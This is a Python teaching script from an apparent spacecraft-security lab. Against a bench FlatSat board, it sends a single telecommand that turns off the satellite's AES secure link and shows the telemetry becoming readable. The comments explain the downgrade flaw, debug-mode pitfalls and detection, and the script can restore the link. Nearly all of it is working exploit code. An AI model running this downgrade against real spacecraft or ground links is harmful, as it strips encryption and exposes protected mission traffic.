#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 07_secure_link_downgrade_usb.py -- turn the spacecraft's own encryption off
# with one telecommand, then read what it was protecting.
#
# Nothing about the cipher is wrong. AES-128 is doing exactly what it was
# asked to do. The defect is that the switch which decides whether to use it
# takes an ordinary telecommand, and that command is not protected any more
# strongly than the traffic it governs.
#
#     worker.cpp:
#       commandAesConfigHandler(space_packet->data[0] != 0);
#         -> secureLinkSetEnabled(false);
#
# This is the shape of the CryptoLib SDLS downgrade (CVE-2026-79954): a
# downgrade is cheaper than an attack on the primitive, and no amount of key
# length changes that.
#
# Expected: the same telemetry that was opaque before the command is readable
# after it, with no key involved at any point.

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_AES_CONFIG, TC_GET_STATUS, hexdump  # noqa: E402


def looks_like_ciphertext(payload: bytes) -> bool:
    """A 16-octet multiple with no printable run. Crude on purpose: the point
    is that the student can see the difference, not that this is a classifier."""
    if not payload or len(payload) % 16:
        return False
    printable = sum(32 <= b < 127 for b in payload)
    return printable < len(payload) * 0.5


# Straight out of the firmware's mission.h. The third octet of a STATUS
# payload is missionStatusFlags(), and one bit of it is the secure link.
MISSION_FLAG_SECURE_LINK = 0x10
MISSION_FLAG_USB_DEBUG = 0x40


def secure_link_bit(payload):
    """Whether the board says its secure link is on, or None if unreadable.

    This is the honest test, and the readability of the telemetry is not.
    With USB debug enabled the firmware skips encrypting the downlink
    regardless of the secure link:

        worker.cpp:684
          const bool bypass_secure_link =
              mission_ctx.usbDebugEnabled || force_cleartext;

    So a bench board with debug on sends cleartext before and after, the
    before/after comparison shows no change, and the lab reports failure
    while the exploit is in fact working. The flag does not lie.
    """
    if payload is None or len(payload) < 3:
        return None, None
    flags = payload[2]
    return bool(flags & MISSION_FLAG_SECURE_LINK), bool(flags & MISSION_FLAG_USB_DEBUG)


def status_reply(replies):
    """The answer to GET_STATUS, not whatever arrived first.

    The board beacons a PING roughly once a second, and a PING payload is
    eight readable octets whether the secure link is up or down. Taking the
    first reply that carries a payload therefore samples the heartbeat, reads
    it as cleartext both before and after the downgrade, and reports that
    nothing changed while the exploit was in fact working.
    """
    return (next((p for p in replies if p.apid == TC_GET_STATUS and p.payload), None)
            or next((p for p in replies if p.payload and p.apid != 0x01), None))


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None, help="serial port (default: probe for it)")
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--restore", action="store_true",
                    help="turn the secure link back on before exiting")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    with FlatSat(port=args.port, encrypt=True, verbose=not args.quiet) as fsat:
        print("\n=== 1. before: ask for status and look at what comes back ===")
        before = fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.5)
        sample = status_reply(before)
        if sample is None:
            print("[!] the board said nothing. Is it powered and is this the binary port?")
            return 1
        print(hexdump(sample.payload[:48]))
        opaque = looks_like_ciphertext(sample.payload)
        print(f"[=] payload looks {'opaque' if opaque else 'readable'} "
              f"({len(sample.payload)} octets)")

        print("\n=== 2. the entire exploit: one command, one byte ===")
        # The byte is the new state. Zero means "stop using the secure link".
        # Sent encrypted, because the link is still up at this point.
        fsat.send(TC_AES_CONFIG, b"\x00", seq=args.seq + 1, listen=1.5)
        time.sleep(0.5)

        print("\n=== 3. after: the same request, the same board ===")
        fsat.encrypt = False          # the link is plaintext now; so are we
        after = fsat.send(TC_GET_STATUS, b"", seq=args.seq + 2, listen=1.5)
        sample2 = status_reply(after)
        if sample2 is None:
            print("[!] nothing came back. Try again; the board may still be settling.")
            return 1
        print(hexdump(sample2.payload[:48]))
        now_opaque = looks_like_ciphertext(sample2.payload)
        print(f"[=] payload looks {'opaque' if now_opaque else 'readable'}")

        was_on, dbg = secure_link_bit(sample.payload)
        now_on, _ = secure_link_bit(sample2.payload)
        print(f"\n[=] secure link flag: {was_on} -> {now_on}")
        if dbg:
            print("[i] USB debug is on, so the downlink is cleartext either way "
                  "(worker.cpp:684). Read the flag, not the hexdump.")

        print()
        if was_on and not now_on:
            print("[+] the link went plaintext. No key was used, broken or needed.")
        elif opaque and not now_opaque:
            print("[+] the link went plaintext. No key was used, broken or needed.")
        elif was_on is None:
            print("[?] no STATUS reply to read the flag from.")
        elif not was_on:
            print("[?] the secure link was already off before the exploit ran. "
                  "Turn it back on and repeat, or the lab has nothing to show.")
        else:
            print("[?] the flag did not move. The command was refused -- check the "
                  "ground-station gate.")

        if args.restore:
            print("\n=== 4. putting it back ===")
            fsat.send(TC_AES_CONFIG, b"\x01", seq=args.seq + 3, encrypt=False, listen=1.5)
            fsat.encrypt = True
            print("[*] secure link re-enabled.")

    print("\nWhat the sensor should have shown: the encryption flag set on one "
          "frame and clear on the next.\nThe transition is the detection. Once it "
          "settles, the state looks entirely normal.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
